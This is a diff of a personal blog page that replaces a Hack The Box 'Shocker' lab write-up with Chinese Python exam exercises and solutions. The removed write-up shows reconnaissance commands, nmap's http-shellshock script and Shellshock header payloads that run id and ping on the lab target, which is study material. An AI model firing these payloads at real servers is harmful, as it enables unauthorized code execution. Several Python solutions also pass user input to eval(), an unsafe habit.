@@ -128,10 +128,10 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="Shocker-Shocker" class="article article-type-Shocker" itemscope itemprop="blogPost">
+    <article id="post-TQC" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2024/12/21/Shocker/" class="article-date">
+      <a href="/2024/12/21/TQC/" class="article-date">
   	<time datetime="2024-12-21T12:32:07.095Z" itemprop="datePublished">2024-12-21</time>
 </a>
     </div>
@@ -145,8 +145,8 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Shocker/">
-        HTB_Shocker
+      <a class="article-title" href="/2024/12/21/TQC/">
+        Exam Python
         
       </a>
     </h1>
@@ -157,155 +157,388 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Shocker"><a href="#Shocker" class="headerlink" title="Shocker"></a>Shocker</h1><p>一、Shellshock的背景<br>Shellshock，又稱Bashdoor，是在Unix中廣泛使用的Bash shell中的一個安全漏洞，首次於2014年9月24日公開。許多互聯網守護進程，如網頁服務器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下訪問計算機系統。</p>
-<p>二、通過試驗和總結，Shellshock漏洞執行的條件<br>1、首先是Unix、linux等系統下的bash版本必須小於等於4.1版本；<br>2、可以猜出/cgi-bin/下目錄的文件；例如：/cgi-bin/test-cgi、/cgi-bin/test.sh、/cgi-bin/test.py、/cgi-bin/test.perl等等；<br>3、/cgi-bin/下的腳本文件通過系統環境變量調用bash的環境；</p>
-<p>nmap -sV -sC -A 10.129.108.18</p>
-<p><img src="img/shocker_Untitled.png" alt="Untitled"></p>
-<ul>
-<li>80/tcp open http Apache httpd 2.4.18 ((Ubuntu))</li>
-<li>2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</li>
+        <ul>
+<li>參考</li>
 </ul>
-<p>Now open the website </p>
-<p><img src="img/shocker_Untitled_1.png" alt="Untitled"></p>
-<p>The page source is quite short</p>
-<p><img src="img/shocker_Untitled_2.png" alt="Untitled"></p>
-<p>Here use feroxbuster scan the HTBIP</p>
+<p><a target="_blank" rel="noopener" href="https://hackmd.io/@J-Liang1122/r1AACpUH9">https://hackmd.io/@J-Liang1122/r1AACpUH9</a></p>
+<p>設計說明：<br>請使用迴圈敘述撰寫一程式，讓使用者輸入一個正整數（&lt;100），然後以三角形的方式依序輸出此數的相乘結果。<br>提示：輸出欄寬為4，且需靠右對齊。</p>
+<p>範例輸1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>
+<p>範例輸出1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2   4</span><br><span class="line">3   6   9</span><br><span class="line">4   8  12  16</span><br><span class="line">5  10  15  20  25</span><br></pre></td></tr></table></figure>
+<p>程式碼:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=eval(input())</span><br><span class="line">c=0</span><br><span class="line">for i in range(1,a+1):</span><br><span class="line">  for j in range(1,i+1):</span><br><span class="line">    c=i*j</span><br><span class="line">    print(&quot;%4d&quot;%(c),end=&#x27;&#x27;)</span><br><span class="line">  print()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>另一種寫法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">n = int(input())</span><br><span class="line">for i in range(1,n+1):</span><br><span class="line">    for j in range(1,i+1):</span><br><span class="line">        print(&quot;　&#123;:&gt;1&#125;&quot;.format(i*j),end=&quot;&quot;)</span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="題目說明"><a href="#題目說明" class="headerlink" title="題目說明"></a>題目說明</h3><ol>
+<li><strong>輸入說明</strong>：輸入一個正整數 ( n )，範圍小於 100。</li>
+<li><strong>輸出說明</strong>：以三角形的格式，依序輸出數字的倍乘結果，並在行首及之後位置使用半形空格來對齊。</li>
+</ol>
+<h3 id="解題思路"><a href="#解題思路" class="headerlink" title="解題思路"></a>解題思路</h3><ol>
+<li>建立一個巢狀迴圈，外層迴圈控制行數，內層迴圈計算該行的乘積值並輸出。</li>
+<li>在每一行中，輸出該行號乘以 1 到行號的每個數字。</li>
+<li>為了保持對齊，需要在每一行前加上適量的空白，以達到題目要求的三角形效果。</li>
+</ol>
+<h3 id="範例輸出分析"><a href="#範例輸出分析" class="headerlink" title="範例輸出分析"></a>範例輸出分析</h3><p>從範例中可以看出：</p>
 <ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -x php,html</li>
+<li>每行的開始處會有一定數量的空白，空白數量依行數增加。</li>
+<li>每一行的數字依序呈現乘積，並在每個乘積之間加上空格。</li>
 </ul>
-<p><img src="img/shocker_Untitled_3.png" alt="Untitled"></p>
-<p>Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a> and <code>dirb</code> actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a></li>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18/</a></li>
+<p>例如，當輸入 <code>5</code> 時，輸出如下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        1</span><br><span class="line">      2   4</span><br><span class="line">    3   6   9</span><br><span class="line">  4   8  12  16</span><br><span class="line">5  10  15  20  25</span><br></pre></td></tr></table></figure></p>
+<h3 id="程式碼實作"><a href="#程式碼實作" class="headerlink" title="程式碼實作"></a>程式碼實作</h3><p>以下是 Python 程式碼，依據上述邏輯來實現所需的三角形輸出格式。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">triangular_multiples</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 輸出每行的前導空格，使其呈現三角形排列</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  &quot;</span> * (n - i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 輸出該行的乘積數字</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i * j:<span class="number">2</span>&#125;</span>&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 換行</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line">triangular_multiples(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>()  <span class="comment"># 分隔行</span></span><br><span class="line">triangular_multiples(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="程式碼解釋"><a href="#程式碼解釋" class="headerlink" title="程式碼解釋"></a>程式碼解釋</h3><ul>
+<li><code>for i in range(1, n + 1)</code>：外層迴圈控制行數，從第 1 行到第 n 行。</li>
+<li><code>print(&quot;  &quot; * (n - i), end=&quot;&quot;)</code>：先印出空格，空格數量依行數遞減，以形成三角形格式。</li>
+<li><code>for j in range(1, i + 1)</code>：內層迴圈控制每行內的數字，計算 <code>i * j</code> 的乘積，並格式化輸出（<code>&#123;i * j:2&#125;</code> 確保兩位數對齊）。</li>
+<li><code>print()</code>：內層迴圈結束後換行，開始新的一行。</li>
 </ul>
-<p>We all know that in the previous scan results, redirection will be performed. Here, selecting -n will not perform this action, and -f will add “/“ to the URL of each request</p>
+<h3 id="測試結果"><a href="#測試結果" class="headerlink" title="測試結果"></a>測試結果</h3><p>當 <code>n = 5</code> 時，輸出如下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        1</span><br><span class="line">      2   4</span><br><span class="line">    3   6   9</span><br><span class="line">  4   8  12  16</span><br><span class="line">5  10  15  20  25</span><br></pre></td></tr></table></figure></p>
+<p>當 <code>n = 12</code> 時，輸出如下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                     1</span><br><span class="line">                   2   4</span><br><span class="line">                 3   6   9</span><br><span class="line">               4   8  12  16</span><br><span class="line">             5  10  15  20  25</span><br><span class="line">           6  12  18  24  30  36</span><br><span class="line">         7  14  21  28  35  42  49</span><br><span class="line">       8  16  24  32  40  48  56  64</span><br><span class="line">     9  18  27  36  45  54  63  72  81</span><br><span class="line">   10  20  30  40  50  60  70  80  90 100</span><br><span class="line"> 11  22  33  44  55  66  77  88  99 110 121</span><br><span class="line">12  24  36  48  60  72  84  96 108 120 132 144</span><br></pre></td></tr></table></figure></p>
+<h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>這樣的輸出符合題目的格式，使用巢狀迴圈控制輸出，每行以一定的空格間隔，使得乘積值呈現三角形</p>
+<hr>
+<p>設計說明：</p>
+<p>(I) 請撰寫一程式，讓使用者輸入兩個正整數a、b（a&lt;=b），輸出從a到b（包含a和b）之間4或9的倍數（一列輸出十個數字、欄寬為4、靠左對齊）以及倍數之個數、總和。</p>
+<p>輸入輸出：</p>
+<p>輸入說明</p>
+<p>兩個正整數a、b（a&lt;=b）</p>
+<p>輸出說明</p>
+<p>格式化輸出兩個正整數之間4或9之倍數（包含a和b）</p>
+<p>倍數個數</p>
+<p>倍數總合</p>
+<p>(3)範例輸入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">55</span><br></pre></td></tr></table></figure>
+<p>範例輸出(·為半形空格)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8...9...12..16..18...20·2427.…28..32·</span><br><span class="line">36..40.…44..45.…48..52..54.</span><br><span class="line">17</span><br><span class="line">513</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>程式寫法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a = eval(input())</span><br><span class="line">b = eval(input())</span><br><span class="line">count = 0</span><br><span class="line">tot = 0</span><br><span class="line">for i in range(a,b+1):</span><br><span class="line">    if i%4 == 0 or i%9 == 0:</span><br><span class="line">        count += 1</span><br><span class="line">        tot += i</span><br><span class="line">        print(&quot;&#123;:&lt;4&#125;&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">        if count%10 == 0:</span><br><span class="line">            print()</span><br><span class="line">print(&quot;\n&#123;&#125;&quot;.format(count))</span><br><span class="line">print(tot)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>另一種寫法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = int( input() )</span><br><span class="line">b = int( input() )</span><br><span class="line">all = 0</span><br><span class="line">count = 0</span><br><span class="line">for i in range( a, b + 1 ):</span><br><span class="line">    if i % 4 == 0 or i % 9 == 0:</span><br><span class="line">        count += 1</span><br><span class="line">        print(&quot;&#123;:&lt;4d&#125;&quot;.format(i), end=&quot;&quot;)</span><br><span class="line">        if count % 10 == 0:</span><br><span class="line">            print()</span><br><span class="line">        all += i</span><br><span class="line">print()</span><br><span class="line">print(count)</span><br><span class="line">print(all)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<p>設計說明：</p>
+<p>請撰寫一程式，要求使用者輸入十個數字並存放在串列中。接著由大到小的順序顯示最大的3個數字</p>
+<p>輸入輸出：</p>
+<p>輸入說明</p>
+<p>十個數字</p>
+<p>輸出說明</p>
+<p>由大到小排序，顯示最大的3個數字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40</span><br><span class="line">32</span><br><span class="line">1</span><br><span class="line">29</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">48</span><br><span class="line">57</span><br><span class="line">44</span><br></pre></td></tr></table></figure>
+<p>範例輸出(·為半形空格)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">57 48 44</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>程式寫法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a = []</span><br><span class="line">for i in range(10):</span><br><span class="line">    a.append(eval(input()))</span><br><span class="line">b = sorted(a)</span><br><span class="line"></span><br><span class="line">print(b[-1],b[-2],b[-3])</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>另一種寫法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = []</span><br><span class="line">for i in range(10):</span><br><span class="line">    a.append(eval(input()))</span><br><span class="line">    b = sorted(a)</span><br><span class="line">print(b[-1],end=&quot; &quot;)</span><br><span class="line">print(b[-2],end=&quot; &quot;)</span><br><span class="line">print(b[-3],end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>題目：計算階乘並記錄已計算結果</p>
+<p>請撰寫一個函數 factorial_memo(n)，它能計算數字 n 的階乘（n! = n × (n-1) × … × 1），同時使用 dictionary 來記錄和儲存已經計算過的階乘結果。當計算新的階乘時，如果已經計算過該值，應直接從 dictionary 中獲取，而不是重新計算。</p>
+<p>函數要求：</p>
 <ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -f -n</li>
+<li>使用遞迴方式計算階乘。</li>
+<li>使用一個 dictionary 來儲存所有已計算過的階乘結果，稱為 memo，以避免重複計算。</li>
+<li>函數應該可以處理多次的階乘請求並儲存歷史計算結果。</li>
 </ul>
-<p><img src="img/shocker_Untitled_4.png" alt="Untitled"></p>
-<p>A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. Common Gateway Interface (CGI) is a resource for accommodating the use of scripts in Web design. As scripts are sent from a server to a Web browser, the CGI-bin is often referenced in a url.</p>
+<p>範例：</p>
+<p>factorial_memo(5)</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a></li>
+<li>輸出應為：120</li>
+<li>內部的 memo 應儲存 {1: 1, 2: 2, 3: 6, 4: 24, 5: 120}</li>
 </ul>
-<blockquote>
-<p>CGI scripts are perl scripts</p>
-</blockquote>
-<p>It can be known that cgi stores many scripts in it, here use -x to search for the file extension of the file below</p>
+<p>factorial_memo(6)</p>
 <ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a> -x sh,cgi,pl</li>
+<li>輸出應為：720</li>
+<li>內部的 memo 應儲存 {1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720}</li>
 </ul>
-<p><img src="img/shocker_Untitled_5.png" alt="Untitled"></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/user.sh">http://10.129.108.18/cgi-bin/user.sh</a></li>
+<p>提示：</p>
+<ol>
+<li>使用遞迴來計算階乘。</li>
+<li>每當你計算一個新階乘時，將結果存入 memo。</li>
+<li>如果查詢的階乘已經在 memo 中，則直接返回該值。</li>
+</ol>
+<p>程式寫法</p>
+<p>這裡有幾種不同寫法，透過不同的技巧來實現 <code>factorial_memo</code> 函數，但都達到相同的目標：</p>
+<p>使用遞迴計算階乘並記錄已計算的結果。</p>
+<h3 id="寫法-1：使用內建函數-lru-cache-進行快取"><a href="#寫法-1：使用內建函數-lru-cache-進行快取" class="headerlink" title="寫法 1：使用內建函數 lru_cache 進行快取"></a>寫法 1：使用內建函數 <code>lru_cache</code> 進行快取</h3><p>Python 提供了 <code>functools.lru_cache</code>，這是一種自動化的快取裝飾器，能幫助我們避免重複計算。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"></span><br><span class="line"><span class="meta">@lru_cache(<span class="params">maxsize=<span class="literal">None</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * factorial_memo(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br></pre></td></tr></table></figure>
+<h3 id="寫法-2：在函數內部使用-memo-字典"><a href="#寫法-2：在函數內部使用-memo-字典" class="headerlink" title="寫法 2：在函數內部使用 memo 字典"></a>寫法 2：在函數內部使用 <code>memo</code> 字典</h3><p>在這個寫法中，我們使用函數內部變數 <code>memo</code>，而不設為預設參數。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;  <span class="comment"># 初始化 memo 字典</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">helper</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> memo:</span><br><span class="line">            <span class="keyword">return</span> memo[x]</span><br><span class="line">        memo[x] = x * helper(x - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> memo[x]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> helper(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br></pre></td></tr></table></figure>
+<h3 id="寫法-3：使用類別來管理-memo"><a href="#寫法-3：使用類別來管理-memo" class="headerlink" title="寫法 3：使用類別來管理 memo"></a>寫法 3：使用類別來管理 <code>memo</code></h3><p>透過類別來管理 <code>memo</code> 字典，這樣可以讓多個函數調用時共用相同的 <code>memo</code>，而且更容易追蹤儲存的階乘結果。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FactorialCalculator</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;  <span class="comment"># 初始化 memo 字典</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">self, n</span>):</span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">in</span> <span class="variable language_">self</span>.memo:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.memo[n]</span><br><span class="line">        <span class="variable language_">self</span>.memo[n] = n * <span class="variable language_">self</span>.factorial_memo(n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line">calculator = FactorialCalculator()</span><br><span class="line"><span class="built_in">print</span>(calculator.factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(calculator.factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br><span class="line"><span class="built_in">print</span>(calculator.memo)               <span class="comment"># 輸出：&#123;1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="寫法-4：使用非遞迴的方式（自底向上）"><a href="#寫法-4：使用非遞迴的方式（自底向上）" class="headerlink" title="寫法 4：使用非遞迴的方式（自底向上）"></a>寫法 4：使用非遞迴的方式（自底向上）</h3><p>透過迴圈進行計算，並儲存每一步的結果。這種方法不使用遞迴，但仍能達到儲存計算結果的效果。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        memo[i] = i * memo[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br></pre></td></tr></table></figure>
+<h3 id="寫法-5：使用全域變數儲存-memo"><a href="#寫法-5：使用全域變數儲存-memo" class="headerlink" title="寫法 5：使用全域變數儲存 memo"></a>寫法 5：使用全域變數儲存 <code>memo</code></h3><p>使用全域變數 <code>memo</code> 來儲存計算過的結果，但這種方式不建議在大型專案中使用，因為全域變數會增加維護的複雜性。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;  <span class="comment"># 定義全域變數 memo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> memo:</span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br><span class="line">    memo[n] = n * factorial_memo(n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br><span class="line"><span class="built_in">print</span>(memo)               <span class="comment"># 輸出：&#123;1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="寫法-6：使用靜態變數儲存-memo（函數內部維護狀態）"><a href="#寫法-6：使用靜態變數儲存-memo（函數內部維護狀態）" class="headerlink" title="寫法 6：使用靜態變數儲存 memo（函數內部維護狀態）"></a>寫法 6：使用靜態變數儲存 <code>memo</code>（函數內部維護狀態）</h3><p>將 <code>memo</code> 作為函數內部的靜態變數，以便在每次函數呼叫時維持狀態。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># 將 memo 附加在函數上作為靜態變數</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(factorial_memo, <span class="string">&quot;memo&quot;</span>):</span><br><span class="line">        factorial_memo.memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> factorial_memo.memo:</span><br><span class="line">        <span class="keyword">return</span> factorial_memo.memo[n]</span><br><span class="line">    </span><br><span class="line">    factorial_memo.memo[n] = n * factorial_memo(n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> factorial_memo.memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo.memo) <span class="comment"># 輸出：&#123;1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720&#125;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>設計說明：<br>(1) 請使用迴圈敘述撰寫一程式，要求使用者輸入一個正整數n（n&lt;10），顯示n*n乘法表。</p>
+<p>(2) 每項運算式需進行格式化排列整齊，每個運算子及運算元輸出的欄寬為2，而每項乘積輸出的欄寬為4，皆靠左對齊不跳行。</p>
+<h3 id="程式碼分解"><a href="#程式碼分解" class="headerlink" title="程式碼分解"></a>程式碼分解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>())  <span class="comment"># 讓使用者輸入一個數字</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):  <span class="comment"># 外層迴圈控制行數，從 1 到 n</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):  <span class="comment"># 內層迴圈控制每一行的列數，從 1 到 n</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; * &#123;&#125; = &#123;:&lt;4&#125;&#x27;</span>.<span class="built_in">format</span>(j, i, (i * j)), end=<span class="string">&#x27;&#x27;</span>)  <span class="comment"># 輸出每一行的乘法結果</span></span><br><span class="line">    <span class="built_in">print</span>()  <span class="comment"># 每行輸出完畢後換行</span></span><br></pre></td></tr></table></figure>
+<h3 id="運作原理"><a href="#運作原理" class="headerlink" title="運作原理"></a>運作原理</h3><p>這段程式碼中有兩個 <code>for</code> 迴圈：</p>
+<ol>
+<li><strong>外層 <code>for i in range(1, n + 1)</code></strong>：控制「行數」。</li>
+<li><strong>內層 <code>for j in range(1, n + 1)</code></strong>：控制每一行的「列數」。</li>
+</ol>
+<p>讓我們逐步解釋程式如何運作，假設使用者輸入 <code>n = 3</code>。</p>
+<h4 id="步驟分析"><a href="#步驟分析" class="headerlink" title="步驟分析"></a>步驟分析</h4><ol>
+<li>使用者輸入 <code>n = 3</code>。</li>
+<li>程式進入<strong>外層迴圈</strong>，<code>i</code> 會從 <code>1</code> 開始，依次取值 <code>1, 2, 3</code>。<ul>
+<li>當 <code>i = 1</code> 時，程式會執行內層迴圈。</li>
+<li>當 <code>i = 2</code> 時，再次執行內層迴圈。</li>
+<li>當 <code>i = 3</code> 時，最後一次執行內層迴圈。</li>
 </ul>
-<p><img src="img/shocker_Untitled_6.png" alt="Untitled"></p>
-<p>when i browse the content</p>
-<p><img src="img/shocker_Untitled_7.png" alt="Untitled"></p>
-<p>Now open the burp and setting something</p>
-<ul>
-<li>Proxy &gt; options</li>
-</ul>
-<p><img src="img/shocker_Untitled_8.png" alt="Untitled"></p>
-<p>Select to intercept the server’s request here, and further observe the contents of the. sh file</p>
-<p><img src="img/shocker_Untitled_9.png" alt="Untitled"></p>
-<p><img src="img/shocker_Untitled_10.png" alt="Untitled"></p>
-<p>Next step is execute shellshock </p>
-<ul>
-<li>locate nse | grep shellshock</li>
-</ul>
-<blockquote>
-<p>/usr/share/nmap/scripts/http-shellshock.nse</p>
-</blockquote>
-<ul>
-<li>cat /usr/share/nmap/scripts/http-shellshock.nse</li>
-</ul>
-<p><img src="img/shocker_Untitled_11.png" alt="Untitled"></p>
-<ul>
-<li>POC ⇒ nmap -sV -p80 —script http-shellshock —script-args uri=/cgi-bin/user.sh,cmd=ls 10.129.108.18</li>
-</ul>
-<p>Set HTTP proxy and redirect in burp</p>
-<p><img src="img/shocker_Untitled_12.png" alt="Untitled"></p>
-<p><img src="img/shocker_Untitled_13.png" alt="Untitled"></p>
-<p><img src="img/shocker_Untitled_14.png" alt="Untitled"></p>
-<p>Change the exploit according to the redirection IP and port set in the previous burp</p>
-<ul>
-<li>nmap -sV -p8081 —script http-shellshock —script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1</li>
-</ul>
-<p>At the same time of issuing this command, it is also necessary to enable burp and proxy intercept on</p>
-<blockquote>
-<p>In orde</p>
-</blockquote>
-<p>If successful, burp will show this screen</p>
-<p><img src="img/shocker_Untitled_15.png" alt="Untitled"></p>
-<p>Then click forward all the way, until this screen appears</p>
-<p><img src="img/shocker_Untitled_16.png" alt="Untitled"></p>
-<p>Check the HTTP History and find the screen record of the successful execution</p>
-<p><img src="img/shocker_Untitled_17.png" alt="Untitled"></p>
-<p>send this record to repeate</p>
-<p><img src="img/shocker_Untitled_18.png" alt="Untitled"></p>
-<p><strong>ShellShock test</strong></p>
-<ul>
-<li>() { :;}; echo; /usr/bin/id</li>
-</ul>
-<p><img src="img/shocker_Untitled_19.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; echo; /bin/ping -c 1 10.129.108.18</li>
-</ul>
-<p><img src="img/shocker_Untitled_20.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; /usr/bin/python3 -c ‘import os;os.system(“echo; /bin/ping -c 2 10.129.108.18”)’; /bin/ping -c 1 10.129.108.18</li>
-</ul>
-<p><img src="img/shocker_Untitled_21.png" alt="Untitled"></p>
-<ul>
